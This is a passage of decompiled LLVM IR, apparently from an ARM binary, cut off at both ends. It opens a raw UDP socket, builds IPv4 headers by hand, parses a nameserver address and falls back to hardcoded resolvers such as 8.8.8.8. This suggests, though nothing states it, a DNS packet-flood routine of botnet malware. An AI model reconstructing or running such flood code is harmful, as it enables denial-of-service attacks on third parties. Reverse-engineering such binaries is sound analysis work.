  %v0_dc48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc48, label %dec_label_pc_dc4c, label %dec_label_pc_daf0

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dae4
  %v0_dc4c = call i32 @function_fe60()
  %v1_dc4c = trunc i32 %v0_dc4c to i8
  %v4_dc50 = sdiv i32 %v0_dc4c, 256
  store i32 %v4_dc50, i32* %r3.global-to-local, align 4
  %v1_dc54 = trunc i32 %v4_dc50 to i8
  %v2_dc54 = load i32, i32* @r6, align 4
  %v3_dc54 = add i32 %v2_dc54, 3
  %v4_dc54 = inttoptr i32 %v3_dc54 to i8*
  store i8 %v1_dc54, i8* %v4_dc54, align 1
  %v3_dc58 = load i32, i32* @r6, align 4
  %v4_dc58 = add i32 %v3_dc58, 2
  %v5_dc58 = inttoptr i32 %v4_dc58 to i8*
  store i8 %v1_dc4c, i8* %v5_dc58, align 1
  br label %dec_label_pc_daf0

dec_label_pc_dc60:                                ; preds = %dec_label_pc_d8c0
  %v0_dc60 = load i32, i32* %fp.global-to-local, align 4
  %v1_dc64 = call i32 @function_1369c(i32 %v0_dc60)
  br label %dec_label_pc_dc68

dec_label_pc_dc68:                                ; preds = %dec_label_pc_d7b0, %dec_label_pc_dc60
  %v29_dc6c = phi i32 [ %v3_d8b0, %dec_label_pc_d7b0 ], [ %v1_dc64, %dec_label_pc_dc60 ]
  store i32 %v3_d7b0, i32* %r4.global-to-local, align 4
  store i32 %v12_d7b0, i32* %r7.global-to-local, align 4
  ret i32 %v29_dc6c

; uselistorder directives
  uselistorder i32 %v4_dc50, { 1, 0 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i32 %v0_dbc0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_dba0, { 1, 0 }
  uselistorder i32 %v1_db94, { 1, 2, 3, 0 }
  uselistorder i32 %v1_db90, { 2, 0, 3, 1 }
  uselistorder i32 %v3_db58, { 1, 0 }
  uselistorder i32 %v4_db04, { 1, 0 }
  uselistorder i1 %v3_dad0, { 1, 0 }
  uselistorder i32 %v1_da78, { 1, 0, 2, 3 }
  uselistorder i32 %v1_da1c, { 1, 0 }
  uselistorder i32 %v1_d9a4, { 1, 0 }
  uselistorder i32 %v1_d92c, { 1, 0 }
  uselistorder i32 %v1_d920, { 1, 0 }
  uselistorder i32 %v0_d8f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_d8e8, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d8e0, { 1, 0 }
  uselistorder i1 %v7_d8b4, { 1, 0 }
  uselistorder i32 %v3_d8b0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d850, { 1, 0 }
  uselistorder i8 %v5_d840, { 1, 0 }
  uselistorder i32 %v5_d824, { 1, 0 }
  uselistorder i32 %v6_d7e8, { 1, 0 }
  uselistorder i32 %v1_d7b4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960), { 6, 7, 0, 8, 1, 9, 2, 3, 10, 11, 12, 4, 5 }
  uselistorder label %dec_label_pc_dc68, { 1, 0 }
  uselistorder label %dec_label_pc_daf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_da90, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_dc74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc74:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_dc74 = load i32, i32* @r4, align 4
  %v15_dc74 = load i32, i32* @r8, align 4
  %v18_dc74 = load i32, i32* @sb, align 4
  %v21_dc74 = load i32, i32* @sl, align 4
  %v24_dc74 = load i32, i32* @fp, align 4
  %v1_dc80 = urem i32 %arg1, 256
  store i32 %v1_dc80, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_dc8c = urem i32 %arg3, 256
  store i32 %v1_dc8c, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_dc98 = call i32 @function_14294(i32 %v1_dc80, i32 4)
  %v0_dc9c = load i32, i32* @r5, align 4
  store i32 %v0_dc9c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_dca8 = load i32, i32* @r4, align 4
  store i32 %v0_dca8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_dcb0 = inttoptr i32 %v0_dc9c to i32*
  %v6_dcb0 = call i32 @function_a4e8(i32 %v0_dca8, i32* %v5_dcb0, i32 2, i32 0)
  %v1_dcbc = urem i32 %v6_dcb0, 256
  store i32 %v1_dcbc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_dcc8 = load i32, i32* @r4, align 4
  store i32 %v0_dcc8, i32* %r0.global-to-local, align 4
  %v0_dccc = load i32, i32* @r5, align 4
  store i32 %v0_dccc, i32* %r1.global-to-local, align 4
  %v5_dcd0 = trunc i32 %v6_dcb0 to i8
  %v6_dcd4 = inttoptr i32 %v0_dccc to i32*
  %v7_dcd4 = call i32 @function_a4e8(i32 %v0_dcc8, i32* %v6_dcd4, i32 3, i32 65535)
  %v0_dcd8 = load i32, i32* @r5, align 4
  store i32 %v0_dcd8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_dce4 = load i32, i32* @r4, align 4
  store i32 %v0_dce4, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_dcec = inttoptr i32 %v0_dcd8 to i32*
  %v6_dcec = call i32 @function_a4e8(i32 %v0_dce4, i32* %v5_dcec, i32 4, i32 64)
  %v1_dcf4 = urem i32 %v6_dcec, 256
  store i32 %v1_dcf4, i32* %ip.global-to-local, align 4
  %v0_dcf8 = load i32, i32* @r5, align 4
  store i32 %v0_dcf8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dd04 = load i32, i32* @r4, align 4
  store i32 %v0_dd04, i32* %r0.global-to-local, align 4
  %v6_dd0c = inttoptr i32 %v0_dcf8 to i32*
  %v7_dd0c = call i32 @function_a4e8(i32 %v0_dd04, i32* %v6_dd0c, i32 5, i32 0)
  %v1_dd18 = urem i32 %v7_dd0c, 256
  store i32 %v1_dd18, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_dd24 = load i32, i32* @r4, align 4
  store i32 %v0_dd24, i32* %r0.global-to-local, align 4
  %v0_dd28 = load i32, i32* @r5, align 4
  store i32 %v0_dd28, i32* %r1.global-to-local, align 4
  %v5_dd30 = inttoptr i32 %v0_dd28 to i32*
  %v6_dd30 = call i32 @function_a4e8(i32 %v0_dd24, i32* %v5_dd30, i32 6, i32 65535)
  %v0_dd34 = load i32, i32* @r5, align 4
  store i32 %v0_dd34, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_dd30, i32* %fp.global-to-local, align 4
  %v0_dd44 = load i32, i32* @r4, align 4
  store i32 %v0_dd44, i32* %r0.global-to-local, align 4
  %v4_dd48 = inttoptr i32 %v0_dd34 to i32*
  %v5_dd48 = call i32 @function_a4e8(i32 %v0_dd44, i32* %v4_dd48, i32 7, i32 53)
  %v0_dd50 = load i32, i32* @r5, align 4
  store i32 %v0_dd50, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_dd48, i32* %sb.global-to-local, align 4
  %v0_dd60 = load i32, i32* @r4, align 4
  store i32 %v0_dd60, i32* %r0.global-to-local, align 4
  %v4_dd64 = inttoptr i32 %v0_dd50 to i32*
  %v5_dd64 = call i32 @function_a4e8(i32 %v0_dd60, i32* %v4_dd64, i32 9, i32 65535)
  %v0_dd68 = load i32, i32* @r5, align 4
  store i32 %v0_dd68, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_dd64, i32* @sl, align 4
  %v0_dd78 = load i32, i32* @r4, align 4
  store i32 %v0_dd78, i32* %r0.global-to-local, align 4
  %v4_dd7c = inttoptr i32 %v0_dd68 to i32*
  %v5_dd7c = call i32 @function_a4e8(i32 %v0_dd78, i32* %v4_dd7c, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dd88 = load i32, i32* @r5, align 4
  store i32 %v0_dd88, i32* %r1.global-to-local, align 4
  store i32 %v5_dd7c, i32* %r8.global-to-local, align 4
  %v0_dd90 = load i32, i32* @r4, align 4
  store i32 %v0_dd90, i32* %r0.global-to-local, align 4
  %v5_dd94 = inttoptr i32 %v0_dd88 to i32*
  %v6_dd94 = call i32 @function_9f84(i32 %v0_dd90, i32* %v5_dd94, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_dda0 = call i32 @function_123b0(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_ddac = call i32 @function_122cc(i32 30, i32* null)
  store i32 %v3_ddac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ddb4 = inttoptr i32 %v3_ddac to i8*
  %v3_ddb4 = call i32 @function_137c8(i8* %v2_ddb4, i32 0)
  store i32 %v3_ddb4, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_ddc0 = call i32 @function_122f8(i32 30)
  store i32 %v1_ddc0, i32* %r0.global-to-local, align 4
  %v0_ddc4 = load i32, i32* @r4, align 4
  %v1_ddc4 = icmp slt i32 %v0_ddc4, 0
  %v2_ddc4 = icmp eq i32 %v0_ddc4, 0
  store i1 %v2_ddc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_ddc4, label %dec_label_pc_e390, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_dc74
  %v2_ddd0 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_ddd0, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_ddd0, i32* %r1.global-to-local, align 4
  store i32 %v0_ddc4, i32* %r0.global-to-local, align 4
  %v4_dde0 = call i32 @function_13864(i32 %v0_ddc4, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_dde0, i32* @r5, align 4
  %v0_dde8 = load i32, i32* @r4, align 4
  store i32 %v0_dde8, i32* %r0.global-to-local, align 4
  %v1_ddec = call i32 @function_1369c(i32 %v0_dde8)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_ddf4 = call i32 @function_123b0(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_de00 = call i32 @function_122cc(i32 31, i32* null)
  %v0_de04 = load i32, i32* @r5, align 4
  store i32 %v0_de04, i32* @r1, align 4
  store i32 %v3_de00, i32* %r2.global-to-local, align 4
  store i32 %v2_ddd0, i32* %r0.global-to-local, align 4
  %v3_de10 = bitcast i32* %stack_var_-2120 to i8*
  %v4_de10 = call i32 @function_13030(i8* %v3_de10, i32 %v0_de04, i32 %v3_de00)
  store i32 %v4_de10, i32* @r4, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_de1c = call i32 @function_122f8(i32 31)
  store i32 %v1_de1c, i32* %r0.global-to-local, align 4
  %v0_de20 = load i32, i32* @r4, align 4
  %v7_de20 = icmp eq i32 %v0_de20, -1
  store i1 %v7_de20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de20, label %dec_label_pc_e390, label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %dec_label_pc_ddcc
  %v0_de28 = load i32, i32* @r5, align 4
  %v9_de28 = icmp eq i32 %v0_de28, %v0_de20
  store i1 %v9_de28, i1* %cpsr_z.global-to-local, align 1
  %v7_de2c = icmp sgt i32 %v0_de28, %v0_de20
  br i1 %v7_de2c, label %dec_label_pc_de30, label %dec_label_pc_e390

dec_label_pc_de30:                                ; preds = %dec_label_pc_de28
  store i32 %v0_de28, i32* %r3.global-to-local, align 4
  store i32 %v0_de20, i32* %r2.global-to-local, align 4
  %v0_de40 = load i32, i32* @r6, align 4
  %v2_de40 = add i32 %v0_de40, %v0_de20
  store i32 %v2_de40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_de48 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_de48, i32* @r7, align 4
  %v1_de78 = add i32 %v0_de28, -1
  br label %dec_label_pc_de70

dec_label_pc_de54:                                ; preds = %dec_label_pc_de98, %bb138
  %v9_de54 = icmp eq i32 %v0_de60, %v1_de78
  store i1 %v9_de54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_de54, label %dec_label_pc_dea4, label %dec_label_pc_de5c

dec_label_pc_de5c:                                ; preds = %dec_label_pc_de88, %dec_label_pc_de54, %bb
  %v0_de9442 = phi i32 [ %v0_de94, %dec_label_pc_de88 ], [ %v0_de9443, %dec_label_pc_de54 ], [ %v0_de94, %bb ]
  %v0_de7438 = phi i32 [ 0, %dec_label_pc_de88 ], [ %v0_de7439, %dec_label_pc_de54 ], [ 0, %bb ]
  store i32 %v0_de28, i32* %r0.global-to-local, align 4
  %v1_de60 = add i32 %v0_de60, 1
  store i32 %v1_de60, i32* %r2.global-to-local, align 4
  %v9_de64 = icmp eq i32 %v0_de28, %v1_de60
  store i1 %v9_de64, i1* %cpsr_z.global-to-local, align 1
  %v1_de68 = add i32 %v0_de68, 1
  store i32 %v1_de68, i32* @r7, align 4
  br i1 %v9_de64, label %dec_label_pc_e390, label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_de30
  %v0_de68 = phi i32 [ %v1_de68, %dec_label_pc_de5c ], [ %v2_de48, %dec_label_pc_de30 ]
  %v0_de60 = phi i32 [ %v1_de60, %dec_label_pc_de5c ], [ %v0_de20, %dec_label_pc_de30 ]
  %v0_de94 = phi i32 [ %v0_de9442, %dec_label_pc_de5c ], [ 0, %dec_label_pc_de30 ]
  %v0_de74 = phi i32 [ %v0_de7438, %dec_label_pc_de5c ], [ 0, %dec_label_pc_de30 ]
  %v0_de7c = phi i32 [ %v1_de7c, %dec_label_pc_de5c ], [ %v2_de40, %dec_label_pc_de30 ]
  %v1_de70 = inttoptr i32 %v0_de7c to i8*
  %v2_de70 = load i8, i8* %v1_de70, align 1
  %v3_de70 = zext i8 %v2_de70 to i32
  store i32 %v3_de70, i32* %r3.global-to-local, align 4
  %v2_de74 = icmp eq i32 %v0_de74, 0
  store i1 %v2_de74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_de78, i32* %ip.global-to-local, align 4
  %v1_de7c = add i32 %v0_de7c, 1
  store i32 %v1_de7c, i32* %r1.global-to-local, align 4
  %v1_de80 = add nsw i32 %v3_de70, -48
  store i32 %v1_de80, i32* %r0.global-to-local, align 4
  br i1 %v2_de74, label %dec_label_pc_de88, label %dec_label_pc_de98

dec_label_pc_de88:                                ; preds = %dec_label_pc_de70
  %v7_de88 = icmp eq i8 %v2_de70, 9
  store i1 %v7_de88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de88, label %dec_label_pc_de5c, label %bb

bb:                                               ; preds = %dec_label_pc_de88
  %v8_de8c = icmp eq i8 %v2_de70, 32
  store i1 %v8_de8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_de8c, label %dec_label_pc_de5c, label %dec_label_pc_de94

dec_label_pc_de94:                                ; preds = %bb
  %v1_de94 = add i32 %v0_de94, 1
  store i32 %v1_de94, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de70, %dec_label_pc_de94
  %v0_de9443 = phi i32 [ %v0_de94, %dec_label_pc_de70 ], [ %v1_de94, %dec_label_pc_de94 ]
  %v0_de7439 = phi i32 [ %v0_de74, %dec_label_pc_de70 ], [ %v1_de94, %dec_label_pc_de94 ]
  %v7_de98 = icmp eq i8 %v2_de70, 46
  store i1 %v7_de98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de98, label %dec_label_pc_de54, label %bb138

bb138:                                            ; preds = %dec_label_pc_de98
  %v8_de9c = icmp eq i32 %v1_de80, 9
  store i1 %v8_de9c, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_de80, 10
  br i1 %tmp, label %dec_label_pc_de54, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de54, %bb138
  %v0_de60.lcssa = phi i32 [ %v1_de78, %dec_label_pc_de54 ], [ %v0_de60, %bb138 ]
  %v2_dea8 = sub i32 %v0_de60.lcssa, %v0_de20
  store i32 %v2_dea8, i32* %r2.global-to-local, align 4
  store i32 %v2_de40, i32* %r1.global-to-local, align 4
  store i32 %v2_de48, i32* %r0.global-to-local, align 4
  %v3_deb4 = call i32 @function_12d58(i32 %v2_de48, i32 %v2_de40, i32 %v2_dea8)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_de48, i32* @r0, align 4
  %v2_dec4 = load i32, i32* @r7, align 4
  %v3_dec4 = inttoptr i32 %v2_dec4 to i8*
  store i8 0, i8* %v3_dec4, align 1
  %v1_dec8 = call i32 @function_13d70(i32 %v2_de48)
  store i32 %v1_dec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_ded020:                              ; preds = %dec_label_pc_e390
  unreachable

dec_label_pc_ded0:                                ; preds = %dec_label_pc_e408, %dec_label_pc_e3f8, %dec_label_pc_e3ec, %dec_label_pc_e3d8, %dec_label_pc_dea4
  %v29_e3d474 = phi i32 [ %v1_e394, %dec_label_pc_e408 ], [ %v1_e394, %dec_label_pc_e3f8 ], [ %v1_e394, %dec_label_pc_e3ec ], [ %v1_e394, %dec_label_pc_e3d8 ], [ %v1_dec8, %dec_label_pc_dea4 ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_e408 ], [ 104859200, %dec_label_pc_e3f8 ], [ 707416650, %dec_label_pc_e3ec ], [ 134744072, %dec_label_pc_e3d8 ], [ %v1_dec8, %dec_label_pc_dea4 ]
  store i32 %v6_dd94, i32* %ip.global-to-local, align 4
  %v2_ded4 = icmp eq i32 %v6_dd94, 0
  store i1 %v2_ded4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ded4, label %dec_label_pc_e3cc, label %dec_label_pc_dedc

dec_label_pc_dedc:                                ; preds = %dec_label_pc_ded0
  store i32 %v6_dd94, i32* %r0.global-to-local, align 4
  %v1_dee0 = inttoptr i32 %v6_dd94 to i8*
  %v2_dee0 = call i32 @function_12cdc(i8* %v1_dee0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_def4 = call i32 @function_13f90(i32 2, i32 3, i32 17)
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v7_def8 = icmp eq i32 %v3_def4, -1
  store i1 %v7_def8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_def8, label %dec_label_pc_e3cc, label %dec_label_pc_df04

dec_label_pc_df04:                                ; preds = %dec_label_pc_dedc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_df10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_df10, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_df24 = call i32 @function_13f60(i32 %v3_def4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_df24, i32* %r0.global-to-local, align 4
  %v7_df28 = icmp eq i32 %v6_df24, -1
  store i1 %v7_df28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_df28, label %dec_label_pc_e3c4, label %dec_label_pc_df30

dec_label_pc_df30:                                ; preds = %dec_label_pc_df04
  store i32 %v1_dc80, i32* %r0.global-to-local, align 4
  %v3_df38 = mul i32 %v7_dcd4, 65536
  store i32 %v3_df38, i32* %lr.global-to-local, align 4
  %v0_df3c = load i32, i32* @sl, align 4
  %v3_df3c = mul i32 %v0_df3c, 65536
  store i32 %v3_df3c, i32* %sl.global-to-local, align 4
  %v0_df40 = load i32, i32* %r8.global-to-local, align 4
  %v0_df44 = load i32, i32* %fp.global-to-local, align 4
  %v0_df48 = load i32, i32* %sb.global-to-local, align 4
  %v3_df48 = mul i32 %v0_df48, 65536
  store i32 %v3_df48, i32* %sb.global-to-local, align 4
  %v5_df4c = trunc i32 %v0_df40 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_df54 = urem i32 %v7_dcd4, 65536
  store i32 %v3_df54, i32* %r2.global-to-local, align 4
  %v3_df58 = urem i32 %v0_df44, 65536
  store i32 %v3_df58, i32* %r3.global-to-local, align 4
  %v3_df5c = urem i32 %v0_df48, 65536
  store i32 %v3_df5c, i32* %r4.global-to-local, align 4
  %v3_df60 = urem i32 %v0_df3c, 65536
  store i32 %v3_df60, i32* %r8.global-to-local, align 4
  %v2_df64 = icmp eq i32 %v1_dc80, 0
  store i1 %v2_df64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_df64, label %dec_label_pc_e3b4, label %dec_label_pc_df88

dec_label_pc_df88:                                ; preds = %dec_label_pc_df30
  %v4_df8c = sext i8 %v5_df4c to i32
  %v2_df90 = add i32 %v4_df8c, %v2_dee0
  store i32 %v2_df90, i32* @fp, align 4
  %v3_df94 = mul i32 %v2_df90, 65536
  %v1_df98 = add i32 %v3_df94, 1769472
  store i32 %v1_df98, i32* @r6, align 4
  %v1_df9c = add i32 %v3_df94, 3080192
  %v1_dfb0 = urem i32 %v0_df3c, 256
  %v3_dfc0 = udiv i32 %v1_df98, 256
  %v1_dfc4 = urem i32 %v7_dcd4, 256
  %v1_dfc8 = and i32 %v3_dfc0, 65280
  %v1_dfcc = urem i32 %v0_df48, 256
  %v3_dfd0 = mul nuw nsw i32 %v1_dfb0, 256
  %v1_dfd8 = urem i32 %v0_df44, 256
  %v3_dfdc = mul nuw nsw i32 %v1_dfcc, 256
  %tmp139 = udiv i32 %v0_df3c, 256
  %v4_dfe0 = urem i32 %tmp139, 256
  %v5_dfe0 = or i32 %v4_dfe0, %v3_dfd0
  store i32 %v5_dfe0, i32* %r8.global-to-local, align 4
  %v4_dfe4 = udiv i32 %v1_df98, 16777216
  %v5_dfe4 = or i32 %v1_dfc8, %v4_dfe4
  store i32 %v5_dfe4, i32* %sl.global-to-local, align 4
  %tmp140 = udiv i32 %v0_df44, 256
  %v3_dff0 = urem i32 %tmp140, 256
  %v4_dff4 = sdiv i32 %v1_df9c, 16777216
  %tmp141 = udiv i32 %v7_dcd4, 256
  %v4_dffc = mul nuw nsw i32 %v1_dfd8, 256
  %v5_dffc = or i32 %v4_dffc, %v3_dff0
  store i32 %v5_dffc, i32* @r5, align 4
  %tmp142 = udiv i32 %v0_df48, 256
  %v4_e000 = urem i32 %tmp142, 256
  %v5_e000 = or i32 %v4_e000, %v3_dfdc
  store i32 %v5_e000, i32* %sb.global-to-local, align 4
  store i32 %v1_dfc4, i32* %r0.global-to-local, align 4
  %v1_e00c = add i32 %v2_dee0, 1
  store i32 %v1_e00c, i32* @r7, align 4
  %v3_e010 = ashr i32 %v1_df9c, 31
  store i32 %v3_e010, i32* @lr, align 4
  store i32 %v1_dfd8, i32* %r1.global-to-local, align 4
  store i32 %v1_dfcc, i32* %r2.global-to-local, align 4
  %v3_e01c75 = udiv i32 %v1_dfc8, 256
  store i32 %v3_e01c75, i32* %r3.global-to-local, align 4
  store i32 %v1_dfb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_e080 = sext i8 %v5_dcd0 to i32
  %sext13 = mul i32 %v6_dcec, 16777216
  %v4_e098 = sdiv i32 %sext13, 16777216
  %sext14 = mul i32 %tmp141, 16777216
  %v4_e0ac = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v7_dcd4, 16777216
  %v4_e0b0 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_df98, 256
  %v4_e0e0 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_df48, 16777216
  %v4_e0e4 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_df44, 16777216
  %v4_e108 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_df3c, 16777216
  %v4_e114 = sdiv i32 %sext19, 16777216
  %v1_e090 = trunc i32 %v4_dff4 to i8
  %extract.t = trunc i32 %v3_e010 to i8
  br label %dec_label_pc_e040

dec_label_pc_e040:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_df88
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_e048 = call i32 @function_14294(i32 600, i32 1)
  store i32 %v2_e048, i32* %r0.global-to-local, align 4
  store i32 %v2_dc98, i32* %lr.global-to-local, align 4
  %v3_e050 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e050, i32* %r3.global-to-local, align 4
  %v2_e054 = load i32, i32* @r4, align 4
  %v5_e054 = mul i32 %v2_e054, 4
  %v6_e054 = add i32 %v5_e054, %v2_dc98
  %v7_e054 = inttoptr i32 %v6_e054 to i32*
  store i32 %v2_e048, i32* %v7_e054, align 4
  %v0_e058 = load i32, i32* %lr.global-to-local, align 4
  %v1_e058 = load i32, i32* %r3.global-to-local, align 4
  %v4_e058 = mul i32 %v1_e058, 4
  %v5_e058 = add i32 %v4_e058, %v0_e058
  %v6_e058 = inttoptr i32 %v5_e058 to i32*
  %v7_e058 = load i32, i32* %v6_e058, align 4
  store i32 %v7_e058, i32* %r1.global-to-local, align 4
  %v1_e05c = inttoptr i32 %v7_e058 to i8*
  %v2_e05c = load i8, i8* %v1_e05c, align 1
  %tmp154 = urem i8 %v2_e05c, 16
  %v1_e060 = zext i8 %tmp154 to i32
  %v1_e064 = or i32 %v1_e060, 64
  store i32 %v1_e064, i32* %r2.global-to-local, align 4
  %v1_e068 = trunc i32 %v1_e064 to i8
  store i8 %v1_e068, i8* %v1_e05c, align 1
  %v0_e06c = load i32, i32* %r1.global-to-local, align 4
  %v1_e06c = inttoptr i32 %v0_e06c to i8*
  %v2_e06c = load i8, i8* %v1_e06c, align 1
  %v1_e070 = and i8 %v2_e06c, -16
  %v1_e074 = or i8 %v1_e070, 5
  store i32 %v1_dd18, i32* %r0.global-to-local, align 4
  store i8 %v1_e074, i8* %v1_e06c, align 1
  store i32 %v4_e080, i32* %r2.global-to-local, align 4
  %v2_e084 = load i32, i32* %r1.global-to-local, align 4
  %v3_e084 = add i32 %v2_e084, 1
  %v4_e084 = inttoptr i32 %v3_e084 to i8*
  store i8 %v5_dcd0, i8* %v4_e084, align 1
  store i32 %v4_dff4, i32* %r3.global-to-local, align 4
  %v0_e08c = load i32, i32* %r0.global-to-local, align 4
  %v2_e08c = icmp eq i32 %v0_e08c, 0
  store i1 %v2_e08c, i1* %cpsr_z.global-to-local, align 1
  %v2_e090 = load i32, i32* %r1.global-to-local, align 4
  %v3_e090 = add i32 %v2_e090, 2
  %v4_e090 = inttoptr i32 %v3_e090 to i8*
  store i8 %v1_e090, i8* %v4_e090, align 1
  store i32 %v3_e010, i32* %r4.global-to-local, align 4
  store i32 %v4_e098, i32* %r0.global-to-local, align 4
